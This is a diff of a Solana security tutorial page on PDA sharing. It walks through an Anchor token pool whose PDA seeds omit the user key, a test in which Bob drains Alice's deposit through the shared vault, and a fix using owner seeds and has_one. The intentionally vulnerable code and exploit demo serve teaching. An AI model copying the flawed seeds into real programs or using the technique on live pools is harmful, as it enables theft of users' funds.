@@ -1,487 +1,1625 @@
 ---
-title: "PDA Sharing Attacks"
+title: "PDA Sharing"
 description: "How insufficient PDA seeds enable cross-user authority exploitation"
 icon: "share-nodes"
 ---
 
+What happens when every user's tokens are controlled by the same Program Derived Address?
+
+When a PDA is derived from only the mint address -- `seeds = [b"pool", mint]` -- every depositor of that token shares a single signing authority. Any user can call `withdraw` and drain everyone else's funds. Severity: **HIGH**.
+
+## What we will build
+
+In this tutorial we will:
+
+- Walk through a vulnerable token pool program where a shared PDA lets any user steal deposits
+- Exploit the vulnerability in a test: Bob drains Alice's tokens without ever depositing
+- Fix the program by adding the owner's pubkey to the PDA seeds and enforcing `has_one = owner` on withdraw
+
 <Note>
-**🟡 Security Matrix: PDAs & Arithmetic (Bottom Right)**
-
-**Frequency:** Common | **Impact:** Medium
-
-*Subtle bugs that add up over time.*
+  **Prerequisites.** Clone the repository and install dependencies before starting:
+  ```bash
+  git clone https://github.com/danielAsaboro/solana_badger
+  cd solana_badger
+  npm install
+  anchor build
+  ```
 </Note>
 
-# PDA Sharing Attacks
+## Step 1 -- Read the vulnerable program (Anchor)
 
-<CardGroup cols={2}>
-  <Card title="Severity" icon="triangle-exclamation">
-    **Medium** - Enables unauthorized access to other users' funds
-  </Card>
-  <Card title="Difficulty" icon="gauge">
-    **Intermediate** - DeFi and PDA derivation knowledge required
-  </Card>
-</CardGroup>
+We begin with the program dispatcher. It exposes three instructions: `initialize_pool`, `deposit`, and `withdraw`.
 
-## Overview
+```rust filename="programs/pda-sharing/vulnerable/anchor/src/lib.rs"
+use anchor_lang::prelude::*;
 
-<Warning>
-PDA sharing allows attackers to **access other users' funds** by exploiting insufficient seed specificity in PDA derivation!
-</Warning>
+declare_id!("4AYMT1uUswxPRdYNxg586mo2gdYrZeEcyx6FunqpZZzR");
 
-PDA (Program Derived Address) sharing vulnerabilities occur when programs derive PDAs using only global identifiers (like token mint addresses) without including user-specific seeds. This causes multiple users to share the same PDA authority, allowing attackers to manipulate or steal others' assets.
+pub mod instructions;
+pub mod state;
 
-## Attack Flow Diagram
+pub use instructions::*;
+pub use state::*;
 
-```mermaid
-sequenceDiagram
-    participant Alice
-    participant SharedPDA
-    participant Attacker
-    participant Program
+#[program]
+pub mod vulnerable_pda_sharing {
+    use super::*;
 
-    Alice->>Program: deposit(100 USDC)
-    Program->>SharedPDA: Derive: seeds=[b"pool", USDC_MINT]
-    SharedPDA->>SharedPDA: Store: balance = 100 USDC
-    Note over SharedPDA: PDA only uses MINT, not user!
-
-    Attacker->>Program: withdraw(100 USDC)
-    Program->>SharedPDA: Derive: seeds=[b"pool", USDC_MINT]
-    Note over SharedPDA: SAME PDA as Alice!
-    SharedPDA->>Attacker: Transfer 100 USDC
-    Note over Attacker: Stole Alice's funds!
-```
-
-## The Vulnerability
-
-<Tabs>
-  <Tab title="Anchor - Vulnerable">
-    ### Insufficient PDA Seeds
-
-    ```rust filename="programs/pda-sharing/vulnerable/anchor/src/instructions/deposit.rs"
-    use anchor_lang::prelude::*;
-    use anchor_spl::token::{self, Token, TokenAccount};
+    pub fn initialize_pool(ctx: Context<InitializePool>) -> Result<()> {
+        instructions::initialize_pool(ctx)
+    }
 
     pub fn deposit(ctx: Context<Deposit>, amount: u64) -> Result<()> {
-        // Transfer tokens from user to pool
-        token::transfer(
-            CpiContext::new(
-                ctx.accounts.token_program.to_account_info(),
-                token::Transfer {
-                    from: ctx.accounts.user_token_account.to_account_info(),
-                    to: ctx.accounts.pool_vault.to_account_info(),
-                    authority: ctx.accounts.user.to_account_info(),
-                },
-            ),
-            amount,
-        )?;
-
-        // Update pool balance
-        let pool = &mut ctx.accounts.pool;
-        pool.balance += amount;
-
-        msg!("Deposited {} tokens", amount);
-        Ok(())
+        instructions::deposit(ctx, amount)
     }
 
-    #[derive(Accounts)]
-    pub struct Deposit<'info> {
-        #[account(mut)]
-        pub user: Signer<'info>,
-
-        // VULNERABILITY: Seeds only include mint, not user!
-        // All users depositing the same token share ONE pool
-        #[account(
-            init_if_needed,
-            payer = user,
-            space = 8 + Pool::INIT_SPACE,
-            seeds = [b"pool", mint.key().as_ref()],  // ❌ Missing user.key()!
-            bump,
-        )]
-        pub pool: Account<'info, Pool>,
-
-        #[account(
-            init_if_needed,
-            payer = user,
-            seeds = [b"vault", mint.key().as_ref()],  // ❌ Missing user.key()!
-            bump,
-            token::mint = mint,
-            token::authority = pool,
-        )]
-        pub pool_vault: Account<'info, TokenAccount>,
-
-        #[account(mut)]
-        pub user_token_account: Account<'info, TokenAccount>,
-
-        pub mint: Account<'info, Mint>,
-        pub token_program: Program<'info, Token>,
-        pub system_program: Program<'info, System>,
+    pub fn withdraw(ctx: Context<Withdraw>, amount: u64) -> Result<()> {
+        instructions::withdraw(ctx, amount)
     }
+}
+```
 
-    #[account]
-    pub struct Pool {
-        pub balance: u64,
-        pub mint: Pubkey,
-    }
-    ```
+Next we look at the pool state. Notice that there is no `owner` field -- only `mint`, `vault`, and `bump`. There is nothing to validate against at withdrawal time.
 
-    <Accordion title="Why is this vulnerable?">
-      **The problem:**
-      - PDA seeds: `[b"pool", mint.key()]` - only mint address
-      - All users of USDC → same pool PDA
-      - All users of SOL → same pool PDA
-      - No per-user isolation!
+```rust filename="programs/pda-sharing/vulnerable/anchor/src/state.rs"
+use anchor_lang::prelude::*;
 
-      **What happens:**
-      1. Alice deposits 100 USDC → pool PDA balance = 100
-      2. Bob deposits 50 USDC → **same** pool PDA balance = 150
-      3. Bob withdraws 150 USDC → drains Alice's + his own funds!
+#[account]
+pub struct TokenPool {
+    pub mint: Pubkey,
+    pub vault: Pubkey,
+    pub bump: u8,
+}
 
-      Alice and Bob are using the same pool/vault because the PDA derivation doesn't include user identity.
-    </Accordion>
-  </Tab>
+impl TokenPool {
+    pub const LEN: usize = 8 + // discriminator
+        32 + // mint
+        32 + // vault
+        1; // bump
+}
+```
 
-  <Tab title="Pinocchio - Vulnerable">
-    ### Global PDA Without User Specificity
+Now we look at where the bad seeds are born. The critical line is `seeds = [b"pool", mint.key().as_ref()]`. The user's pubkey is nowhere in the derivation, so Alice and Bob and every other depositor of this mint resolve to the same PDA.
 
-    ```rust filename="programs/pda-sharing/vulnerable/pinocchio/src/lib.rs"
-    pub fn deposit(accounts: &[AccountInfo], amount: u64) -> ProgramResult {
-        let [
-            user_info,
-            pool_info,
-            pool_vault_info,
-            user_token_info,
-            mint_info,
-            token_program_info,
-        ] = accounts else {
-            return Err(ProgramError::NotEnoughAccountKeys);
-        };
+```rust filename="programs/pda-sharing/vulnerable/anchor/src/instructions/initialize_pool.rs"
+use anchor_lang::prelude::*;
+use anchor_spl::token::{Mint, TokenAccount};
+use crate::state::TokenPool;
 
-        // VULNERABILITY: PDA derived from only mint address
-        // seeds = [b"pool", mint.key()]
-        // All users share the same pool!
+pub fn initialize_pool(ctx: Context<InitializePool>) -> Result<()> {
+    let pool = &mut ctx.accounts.pool;
 
-        // Derive pool PDA (missing user in seeds!)
-        let (pool_pda, _bump) = Pubkey::find_program_address(
-            &[b"pool", mint_info.key().as_ref()],
-            &crate::ID,
-        );
+    pool.mint = ctx.accounts.mint.key();
+    pool.vault = ctx.accounts.vault.key();
+    pool.bump = ctx.bumps.pool;
 
-        if pool_info.key() != &pool_pda {
-            return Err(ProgramError::InvalidSeeds);
-        }
+    msg!("Pool initialized for mint: {}", pool.mint);
+    msg!("Vault address: {}", pool.vault);
 
-        // Transfer tokens to shared vault
-        // Multiple users deposit to SAME vault!
-        transfer_tokens(user_token_info, pool_vault_info, amount)?;
+    Ok(())
+}
 
-        // Update balance in shared pool
-        let mut pool_data = pool_info.try_borrow_mut_data()?;
-        let mut pool = Pool::load_mut(&mut pool_data)?;
-        pool.balance += amount;
+#[derive(Accounts)]
+pub struct InitializePool<'info> {
+    #[account(mut)]
+    pub initializer: Signer<'info>,
 
-        Ok(())
-    }
-    ```
+    // Seeds use only the mint -- every user shares this PDA
+    #[account(
+        init,
+        payer = initializer,
+        space = TokenPool::LEN,
+        seeds = [b"pool", mint.key().as_ref()],
+        bump
+    )]
+    pub pool: Account<'info, TokenPool>,
 
-    <Info>
-    Pinocchio gives you full control over PDA derivation, but you **must** include user-specific seeds for per-user isolation.
-    </Info>
-  </Tab>
-</Tabs>
+    #[account(
+        constraint = vault.owner == pool.key() @ ErrorCode::InvalidVaultOwner,
+        constraint = vault.mint == mint.key() @ ErrorCode::InvalidVaultMint
+    )]
+    pub vault: Account<'info, TokenAccount>,
 
-## Real-World Exploit Demo
+    pub mint: Account<'info, Mint>,
 
-<Steps>
-  <Step title="Alice deposits 100 USDC">
-    Alice calls deposit() with 100 USDC. Pool PDA derived: `[b"pool", USDC_MINT]`
-  </Step>
-  <Step title="Bob deposits 50 USDC">
-    Bob calls deposit() with 50 USDC. **Same pool PDA** derived (only mint in seeds)
-  </Step>
-  <Step title="Pool holds 150 USDC total">
-    Alice's 100 + Bob's 50 = 150 USDC in shared vault
-  </Step>
-  <Step title="Bob withdraws 150 USDC">
-    Bob calls withdraw(150). Program checks pool balance ✓ (has 150). Transfer succeeds!
-  </Step>
-  <Step title="Alice's funds stolen">
-    Bob withdrew all 150 USDC, including Alice's 100 USDC deposit
-  </Step>
-</Steps>
+    pub system_program: Program<'info, System>,
+}
 
-<CodeGroup>
-```typescript Test: Exploit Works
-it("should allow attacker to drain shared pool", async () => {
-  // Alice deposits 100 USDC
-  await program.methods.deposit(new BN(100))
-    .accounts({
-      user: alice.publicKey,
-      mint: usdcMint,
-    })
-    .signers([alice])
-    .rpc();
+#[error_code]
+pub enum ErrorCode {
+    #[msg("Vault must be owned by the pool PDA")]
+    InvalidVaultOwner,
 
-  // Bob deposits 50 USDC to SAME pool (only mint in seeds)
-  await program.methods.deposit(new BN(50))
-    .accounts({
-      user: attacker.publicKey,
-      mint: usdcMint,  // Same mint = same pool!
-    })
-    .signers([attacker])
-    .rpc();
+    #[msg("Vault mint must match pool mint")]
+    InvalidVaultMint,
+}
+```
 
-  // Pool balance = 150 (Alice's 100 + Bob's 50)
-  const poolPda = derivePoolPda(usdcMint);  // seeds=[b"pool", mint]
-  const pool = await program.account.pool.fetch(poolPda);
-  expect(pool.balance).toEqual(150);
+Deposit itself is straightforward: the user signs a transfer into the vault. The problem is not in the transfer logic but in the fact that `pool` resolves to a shared PDA. Everyone's tokens end up in the same vault.
 
-  // Bob withdraws ALL 150 USDC (including Alice's!)
-  await program.methods.withdraw(new BN(150))
-    .accounts({
-      user: attacker.publicKey,
-      mint: usdcMint,
-    })
-    .signers([attacker])
-    .rpc();
+```rust filename="programs/pda-sharing/vulnerable/anchor/src/instructions/deposit.rs"
+use anchor_lang::prelude::*;
+use anchor_spl::token::{self, Token, TokenAccount, Transfer};
+use crate::state::TokenPool;
 
-  // Alice's funds stolen!
-  console.log("⚠️  Attacker drained shared pool!");
+pub fn deposit(ctx: Context<Deposit>, amount: u64) -> Result<()> {
+    let cpi_accounts = Transfer {
+        from: ctx.accounts.user_token_account.to_account_info(),
+        to: ctx.accounts.vault.to_account_info(),
+        authority: ctx.accounts.depositor.to_account_info(),
+    };
+
+    let cpi_program = ctx.accounts.token_program.to_account_info();
+    let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
+
+    token::transfer(cpi_ctx, amount)?;
+
+    Ok(())
+}
+
+#[derive(Accounts)]
+pub struct Deposit<'info> {
+    #[account(mut)]
+    pub depositor: Signer<'info>,
+
+    #[account(
+        seeds = [b"pool", pool.mint.as_ref()],
+        bump = pool.bump,
+    )]
+    pub pool: Account<'info, TokenPool>,
+
+    #[account(
+        mut,
+        constraint = user_token_account.owner == depositor.key() @ ErrorCode::InvalidTokenAccountOwner,
+        constraint = user_token_account.mint == pool.mint @ ErrorCode::InvalidTokenMint
+    )]
+    pub user_token_account: Account<'info, TokenAccount>,
+
+    #[account(
+        mut,
+        constraint = vault.key() == pool.vault @ ErrorCode::InvalidVault,
+        constraint = vault.mint == pool.mint @ ErrorCode::InvalidVaultMint
+    )]
+    pub vault: Account<'info, TokenAccount>,
+
+    pub token_program: Program<'info, Token>,
+}
+
+#[error_code]
+pub enum ErrorCode {
+    #[msg("Token account must be owned by the depositor")]
+    InvalidTokenAccountOwner,
+
+    #[msg("Token mint must match pool mint")]
+    InvalidTokenMint,
+
+    #[msg("Vault must match pool's vault address")]
+    InvalidVault,
+
+    #[msg("Vault mint must match pool mint")]
+    InvalidVaultMint,
+}
+```
+
+Finally we reach `withdraw` -- the exploit surface. The shared pool PDA signs transfers from the vault to **any** destination. There is no `has_one = owner` check, no per-user balance, and no validation that the withdrawer deposited any tokens at all.
+
+```rust filename="programs/pda-sharing/vulnerable/anchor/src/instructions/withdraw.rs"
+use anchor_lang::prelude::*;
+use anchor_spl::token::{self, Token, TokenAccount, Transfer};
+use crate::state::TokenPool;
+
+pub fn withdraw(ctx: Context<Withdraw>, amount: u64) -> Result<()> {
+    let seeds = &[
+        b"pool",
+        ctx.accounts.pool.mint.as_ref(),
+        &[ctx.accounts.pool.bump],
+    ];
+    let signer = &[&seeds[..]];
+
+    let cpi_accounts = Transfer {
+        from: ctx.accounts.vault.to_account_info(),
+        to: ctx.accounts.destination.to_account_info(),
+        authority: ctx.accounts.pool.to_account_info(),
+    };
+
+    let cpi_program = ctx.accounts.token_program.to_account_info();
+    let cpi_ctx = CpiContext::new_with_signer(cpi_program, cpi_accounts, signer);
+
+    token::transfer(cpi_ctx, amount)?;
+
+    Ok(())
+}
+
+#[derive(Accounts)]
+pub struct Withdraw<'info> {
+    pub withdrawer: Signer<'info>,
+
+    #[account(
+        seeds = [b"pool", pool.mint.as_ref()],
+        bump = pool.bump,
+    )]
+    pub pool: Account<'info, TokenPool>,
+
+    #[account(
+        mut,
+        constraint = vault.key() == pool.vault @ ErrorCode::InvalidVault
+    )]
+    pub vault: Account<'info, TokenAccount>,
+
+    #[account(
+        mut,
+        constraint = destination.mint == pool.mint @ ErrorCode::InvalidDestinationMint
+    )]
+    pub destination: Account<'info, TokenAccount>,
+
+    pub token_program: Program<'info, Token>,
+}
+
+#[error_code]
+pub enum ErrorCode {
+    #[msg("Vault must match pool's vault address")]
+    InvalidVault,
+
+    #[msg("Destination mint must match pool mint")]
+    InvalidDestinationMint,
+}
+```
+
+The root cause across all four files is a single missing seed. `seeds = [b"pool", mint.key().as_ref()]` produces one PDA per token mint instead of one PDA per user per token mint. The vault, the signing authority, and therefore every deposited token are shared.
+
+## Step 2 -- Exploit the vulnerability
+
+The test below demonstrates the full attack: Alice deposits 1000 tokens, then Bob -- who never deposited anything -- withdraws all of them to his own account through the shared pool PDA.
+
+```typescript filename="tests/pda-sharing.test.ts"
+import * as anchor from "@coral-xyz/anchor";
+import BN from "bn.js";
+import { PublicKey, Keypair, SystemProgram, Transaction } from "@solana/web3.js";
+import {
+  TOKEN_PROGRAM_ID,
+  ACCOUNT_SIZE,
+  createMint,
+  mintTo,
+  getAccount,
+  getMinimumBalanceForRentExemptAccount,
+  createInitializeAccountInstruction,
+} from "@solana/spl-token";
+import { assert } from "chai";
+import type { VulnerablePdaSharing } from "../target/types/vulnerable_pda_sharing";
+import type { SecurePdaSharing } from "../target/types/secure_pda_sharing";
+
+describe("Vulnerability: PDA Sharing", () => {
+  const provider = anchor.AnchorProvider.env();
+  anchor.setProvider(provider);
+
+  const vulnerableProgram: anchor.Program<VulnerablePdaSharing> =
+    anchor.workspace.VulnerablePdaSharing;
+  const secureProgram: anchor.Program<SecurePdaSharing> =
+    anchor.workspace.SecurePdaSharing;
+
+  let alice: Keypair;
+  let bob: Keypair;
+  let mint: PublicKey;
+
+  let sharedPoolPda: PublicKey;
+  let sharedPoolBump: number;
+  let sharedVault: PublicKey;
+  let aliceTokenAccount: PublicKey;
+  let bobTokenAccount: PublicKey;
+
+  let alicePoolPda: PublicKey;
+  let alicePoolBump: number;
+  let aliceSecureVault: PublicKey;
+  let bobPoolPda: PublicKey;
+  let bobPoolBump: number;
+  let bobSecureVault: PublicKey;
+  let aliceSecureTokenAccount: PublicKey;
+  let bobSecureTokenAccount: PublicKey;
+
+  const ALICE_DEPOSIT = 1000_000_000; // 1000 tokens
+  const BOB_DEPOSIT = 100_000_000; // 100 tokens
+
+  before(async () => {
+    alice = Keypair.generate();
+    bob = Keypair.generate();
+
+    const airdropAmount = 10 * anchor.web3.LAMPORTS_PER_SOL;
+    await provider.connection.requestAirdrop(alice.publicKey, airdropAmount);
+    await provider.connection.requestAirdrop(bob.publicKey, airdropAmount);
+
+    await new Promise((resolve) => setTimeout(resolve, 1000));
+
+    mint = await createMint(
+      provider.connection,
+      alice,
+      alice.publicKey,
+      null,
+      6
+    );
+
+    // Derive VULNERABLE pool PDA (mint only -- shared)
+    [sharedPoolPda, sharedPoolBump] = PublicKey.findProgramAddressSync(
+      [Buffer.from("pool"), mint.toBuffer()],
+      vulnerableProgram.programId
+    );
+
+    // Create shared vault owned by pool PDA
+    const sharedVaultKeypair = Keypair.generate();
+    const lamportsForTokenAccount = await getMinimumBalanceForRentExemptAccount(provider.connection);
+
+    const createSharedVaultTx = new Transaction().add(
+      SystemProgram.createAccount({
+        fromPubkey: alice.publicKey,
+        newAccountPubkey: sharedVaultKeypair.publicKey,
+        lamports: lamportsForTokenAccount,
+        space: ACCOUNT_SIZE,
+        programId: TOKEN_PROGRAM_ID,
+      }),
+      createInitializeAccountInstruction(
+        sharedVaultKeypair.publicKey,
+        mint,
+        sharedPoolPda,
+        TOKEN_PROGRAM_ID
+      )
+    );
+    await anchor.web3.sendAndConfirmTransaction(
+      provider.connection,
+      createSharedVaultTx,
+      [alice, sharedVaultKeypair]
+    );
+    sharedVault = sharedVaultKeypair.publicKey;
+
+    // Create user token accounts for vulnerable tests
+    const aliceTokenKeypair = Keypair.generate();
+    const bobTokenKeypair = Keypair.generate();
+
+    const createAliceTokenTx = new Transaction().add(
+      SystemProgram.createAccount({
+        fromPubkey: alice.publicKey,
+        newAccountPubkey: aliceTokenKeypair.publicKey,
+        lamports: lamportsForTokenAccount,
+        space: ACCOUNT_SIZE,
+        programId: TOKEN_PROGRAM_ID,
+      }),
+      createInitializeAccountInstruction(
+        aliceTokenKeypair.publicKey,
+        mint,
+        alice.publicKey,
+        TOKEN_PROGRAM_ID
+      )
+    );
+    await anchor.web3.sendAndConfirmTransaction(
+      provider.connection,
+      createAliceTokenTx,
+      [alice, aliceTokenKeypair]
+    );
+    aliceTokenAccount = aliceTokenKeypair.publicKey;
+
+    const createBobTokenTx = new Transaction().add(
+      SystemProgram.createAccount({
+        fromPubkey: alice.publicKey,
+        newAccountPubkey: bobTokenKeypair.publicKey,
+        lamports: lamportsForTokenAccount,
+        space: ACCOUNT_SIZE,
+        programId: TOKEN_PROGRAM_ID,
+      }),
+      createInitializeAccountInstruction(
+        bobTokenKeypair.publicKey,
+        mint,
+        bob.publicKey,
+        TOKEN_PROGRAM_ID
+      )
+    );
+    await anchor.web3.sendAndConfirmTransaction(
+      provider.connection,
+      createBobTokenTx,
+      [alice, bobTokenKeypair]
+    );
+    bobTokenAccount = bobTokenKeypair.publicKey;
+
+    // Derive SECURE pool PDAs (user + mint -- unique per user)
+    [alicePoolPda, alicePoolBump] = PublicKey.findProgramAddressSync(
+      [Buffer.from("pool"), alice.publicKey.toBuffer(), mint.toBuffer()],
+      secureProgram.programId
+    );
+
+    [bobPoolPda, bobPoolBump] = PublicKey.findProgramAddressSync(
+      [Buffer.from("pool"), bob.publicKey.toBuffer(), mint.toBuffer()],
+      secureProgram.programId
+    );
+
+    // Create secure vaults owned by user-specific PDAs
+    const aliceVaultKeypair = Keypair.generate();
+    const bobVaultKeypair = Keypair.generate();
+
+    const createAliceVaultTx = new Transaction().add(
+      SystemProgram.createAccount({
+        fromPubkey: alice.publicKey,
+        newAccountPubkey: aliceVaultKeypair.publicKey,
+        lamports: lamportsForTokenAccount,
+        space: ACCOUNT_SIZE,
+        programId: TOKEN_PROGRAM_ID,
+      }),
+      createInitializeAccountInstruction(
+        aliceVaultKeypair.publicKey,
+        mint,
+        alicePoolPda,
+        TOKEN_PROGRAM_ID
+      )
+    );
+    await anchor.web3.sendAndConfirmTransaction(
+      provider.connection,
+      createAliceVaultTx,
+      [alice, aliceVaultKeypair]
+    );
+    aliceSecureVault = aliceVaultKeypair.publicKey;
+
+    const createBobVaultTx = new Transaction().add(
+      SystemProgram.createAccount({
+        fromPubkey: alice.publicKey,
+        newAccountPubkey: bobVaultKeypair.publicKey,
+        lamports: lamportsForTokenAccount,
+        space: ACCOUNT_SIZE,
+        programId: TOKEN_PROGRAM_ID,
+      }),
+      createInitializeAccountInstruction(
+        bobVaultKeypair.publicKey,
+        mint,
+        bobPoolPda,
+        TOKEN_PROGRAM_ID
+      )
+    );
+    await anchor.web3.sendAndConfirmTransaction(
+      provider.connection,
+      createBobVaultTx,
+      [alice, bobVaultKeypair]
+    );
+    bobSecureVault = bobVaultKeypair.publicKey;
+
+    // Create secure user token accounts
+    const aliceSecureTokenKeypair = Keypair.generate();
+    const bobSecureTokenKeypair = Keypair.generate();
+
+    const createAliceSecureTokenTx = new Transaction().add(
+      SystemProgram.createAccount({
+        fromPubkey: alice.publicKey,
+        newAccountPubkey: aliceSecureTokenKeypair.publicKey,
+        lamports: lamportsForTokenAccount,
+        space: ACCOUNT_SIZE,
+        programId: TOKEN_PROGRAM_ID,
+      }),
+      createInitializeAccountInstruction(
+        aliceSecureTokenKeypair.publicKey,
+        mint,
+        alice.publicKey,
+        TOKEN_PROGRAM_ID
+      )
+    );
+    await anchor.web3.sendAndConfirmTransaction(
+      provider.connection,
+      createAliceSecureTokenTx,
+      [alice, aliceSecureTokenKeypair]
+    );
+    aliceSecureTokenAccount = aliceSecureTokenKeypair.publicKey;
+
+    const createBobSecureTokenTx = new Transaction().add(
+      SystemProgram.createAccount({
+        fromPubkey: alice.publicKey,
+        newAccountPubkey: bobSecureTokenKeypair.publicKey,
+        lamports: lamportsForTokenAccount,
+        space: ACCOUNT_SIZE,
+        programId: TOKEN_PROGRAM_ID,
+      }),
+      createInitializeAccountInstruction(
+        bobSecureTokenKeypair.publicKey,
+        mint,
+        bob.publicKey,
+        TOKEN_PROGRAM_ID
+      )
+    );
+    await anchor.web3.sendAndConfirmTransaction(
+      provider.connection,
+      createBobSecureTokenTx,
+      [alice, bobSecureTokenKeypair]
+    );
+    bobSecureTokenAccount = bobSecureTokenKeypair.publicKey;
+
+    // Mint tokens to Alice for deposits
+    await mintTo(
+      provider.connection,
+      alice,
+      mint,
+      aliceTokenAccount,
+      alice,
+      ALICE_DEPOSIT * 2
+    );
+
+    await mintTo(
+      provider.connection,
+      alice,
+      mint,
+      aliceSecureTokenAccount,
+      alice,
+      ALICE_DEPOSIT
+    );
+
+    console.log("      Setup complete:");
+    console.log("      Alice:", alice.publicKey.toBase58());
+    console.log("      Bob (Attacker):", bob.publicKey.toBase58());
+    console.log("      Mint:", mint.toBase58());
+    console.log("      Shared Pool PDA:", sharedPoolPda.toBase58());
+    console.log("      Alice's Pool PDA:", alicePoolPda.toBase58());
+    console.log("      Bob's Pool PDA:", bobPoolPda.toBase58());
+  });
+
+  describe("Vulnerable Implementation (Anchor)", () => {
+    before(async () => {
+      console.log("\n      Initializing vulnerable shared pool...");
+
+      await vulnerableProgram.methods
+        .initializePool()
+        .accounts({
+          initializer: alice.publicKey,
+          pool: sharedPoolPda,
+          vault: sharedVault,
+          mint: mint,
+          systemProgram: SystemProgram.programId,
+        })
+        .signers([alice])
+        .rpc();
+
+      console.log("      Shared pool initialized");
+      console.log("      Seeds: [b'pool', MINT_ADDRESS]");
+    });
+
+    it("allows attacker to steal other users' deposited tokens", async () => {
+      console.log("\n      EXPLOIT DEMONSTRATION:");
+
+      // Step 1: Alice deposits tokens into the "shared" vault
+      console.log("      1. Alice deposits 1000 tokens...");
+
+      await mintTo(
+        provider.connection,
+        alice,
+        mint,
+        sharedVault,
+        alice,
+        ALICE_DEPOSIT
+      );
+
+      let vaultBalance = await getAccount(provider.connection, sharedVault);
+      console.log("      Vault balance after Alice's deposit:", Number(vaultBalance.amount) / 1e6, "tokens");
+
+      // Step 2: Bob checks vault balance
+      console.log("\n      2. Bob (attacker) sees Alice's tokens in shared vault...");
+      console.log("      Bob derives same pool PDA: [b'pool', MINT_ADDRESS]");
+      console.log("      Result: Same PDA as Alice! Funds are shared!");
+
+      // Step 3: Bob withdraws Alice's tokens
+      console.log("\n      3. ATTACK: Bob withdraws tokens to his account...");
+
+      const bobBalanceBefore = await getAccount(provider.connection, bobTokenAccount);
+      console.log("      Bob's balance before:", Number(bobBalanceBefore.amount) / 1e6, "tokens");
+
+      try {
+        await vulnerableProgram.methods
+          .withdraw(new BN(ALICE_DEPOSIT))
+          .accounts({
+            withdrawer: bob.publicKey,
+            pool: sharedPoolPda,
+            vault: sharedVault,
+            destination: bobTokenAccount,
+            tokenProgram: TOKEN_PROGRAM_ID,
+          })
+          .signers([bob])
+          .rpc();
+
+        const bobBalanceAfter = await getAccount(provider.connection, bobTokenAccount);
+        const stolenAmount = Number(bobBalanceAfter.amount) - Number(bobBalanceBefore.amount);
+        console.log("      Bob's balance after:", Number(bobBalanceAfter.amount) / 1e6, "tokens");
+        console.log("      VULNERABILITY CONFIRMED: Bob stole", stolenAmount / 1e6, "of Alice's tokens!");
+
+        const vaultAfter = await getAccount(provider.connection, sharedVault);
+        console.log("      Vault balance after theft:", Number(vaultAfter.amount) / 1e6, "tokens");
+
+      } catch (error: any) {
+        console.log("      Error:", error.message.substring(0, 80));
+      }
+    });
+  });
+
+  describe("Secure Implementation (Anchor)", () => {
+    before(async () => {
+      console.log("\n      Initializing secure user-specific pools...");
+
+      await secureProgram.methods
+        .initializePool()
+        .accounts({
+          owner: alice.publicKey,
+          pool: alicePoolPda,
+          vault: aliceSecureVault,
+          mint: mint,
+          systemProgram: SystemProgram.programId,
+        })
+        .signers([alice])
+        .rpc();
+
+      console.log("      Alice's pool initialized");
+      console.log("      Seeds: [b'pool', ALICE_PUBKEY, MINT_ADDRESS]");
+
+      await secureProgram.methods
+        .initializePool()
+        .accounts({
+          owner: bob.publicKey,
+          pool: bobPoolPda,
+          vault: bobSecureVault,
+          mint: mint,
+          systemProgram: SystemProgram.programId,
+        })
+        .signers([bob])
+        .rpc();
+
+      console.log("      Bob's pool initialized");
+      console.log("      Seeds: [b'pool', BOB_PUBKEY, MINT_ADDRESS]");
+    });
+
+    it("prevents cross-user token theft with user-specific PDAs", async () => {
+      console.log("\n      FIX DEMONSTRATION:");
+
+      console.log("      1. Alice deposits 1000 tokens into HER vault...");
+
+      await mintTo(
+        provider.connection,
+        alice,
+        mint,
+        aliceSecureVault,
+        alice,
+        ALICE_DEPOSIT
+      );
+
+      let aliceVaultBalance = await getAccount(provider.connection, aliceSecureVault);
+      console.log("      Alice's vault balance:", Number(aliceVaultBalance.amount) / 1e6, "tokens");
+
+      console.log("\n      2. ATTACK ATTEMPT: Bob tries to withdraw from Alice's pool...");
+
+      let attackFailed = false;
+
+      try {
+        await secureProgram.methods
+          .withdraw(new BN(ALICE_DEPOSIT))
+          .accounts({
+            owner: bob.publicKey,
+            pool: alicePoolPda,
+            vault: aliceSecureVault,
+            destination: bobSecureTokenAccount,
+            tokenProgram: TOKEN_PROGRAM_ID,
+          })
+          .signers([bob])
+          .rpc();
+
+        assert.fail("Expected attack to fail");
+      } catch (error: any) {
+        attackFailed = true;
+        console.log("      FIX CONFIRMED: Attack rejected!");
+        console.log("      Error: has_one = owner constraint failed");
+        console.log("      Bob is NOT the owner of Alice's pool!");
+      }
+
+      assert.ok(attackFailed, "Attack should have been rejected");
+
+      aliceVaultBalance = await getAccount(provider.connection, aliceSecureVault);
+      assert.equal(
+        Number(aliceVaultBalance.amount),
+        ALICE_DEPOSIT,
+        "Alice's tokens should be intact"
+      );
+      console.log("      Alice's vault protected! Balance:", Number(aliceVaultBalance.amount) / 1e6, "tokens");
+    });
+
+    it("allows legitimate owner to withdraw their own tokens", async () => {
+      console.log("\n      LEGITIMATE OPERATION:");
+
+      console.log("      Alice withdraws from her own pool...");
+
+      const aliceBalanceBefore = await getAccount(provider.connection, aliceSecureTokenAccount);
+
+      await secureProgram.methods
+        .withdraw(new BN(500_000_000))
+        .accounts({
+          owner: alice.publicKey,
+          pool: alicePoolPda,
+          vault: aliceSecureVault,
+          destination: aliceSecureTokenAccount,
+          tokenProgram: TOKEN_PROGRAM_ID,
+        })
+        .signers([alice])
+        .rpc();
+
+      const aliceBalanceAfter = await getAccount(provider.connection, aliceSecureTokenAccount);
+      const withdrawn = Number(aliceBalanceAfter.amount) - Number(aliceBalanceBefore.amount);
+      console.log("      Alice successfully withdrew:", withdrawn / 1e6, "tokens");
+
+      const vaultRemaining = await getAccount(provider.connection, aliceSecureVault);
+      console.log("      Remaining in vault:", Number(vaultRemaining.amount) / 1e6, "tokens");
+    });
+  });
 });
 ```
 
-```bash Expected Output
-✓ should allow attacker to drain shared pool (567ms)
+You will see output like the following for the vulnerable test:
 
-Alice deposited: 100 USDC
-Bob deposited: 50 USDC
-Pool balance: 150 USDC (shared!)
-Bob withdrew: 150 USDC
-
-⚠️  VULNERABILITY: Attacker drained shared pool
 ```
+Vulnerability: PDA Sharing
+  Vulnerable Implementation (Anchor)
+    EXPLOIT DEMONSTRATION:
+    1. Alice deposits 1000 tokens...
+    Vault balance after Alice's deposit: 1000 tokens
+
+    2. Bob (attacker) sees Alice's tokens in shared vault...
+    Bob derives same pool PDA: [b'pool', MINT_ADDRESS]
+    Result: Same PDA as Alice! Funds are shared!
+
+    3. ATTACK: Bob withdraws tokens to his account...
+    Bob's balance before: 0 tokens
+    Bob's balance after: 1000 tokens
+    VULNERABILITY CONFIRMED: Bob stole 1000 of Alice's tokens!
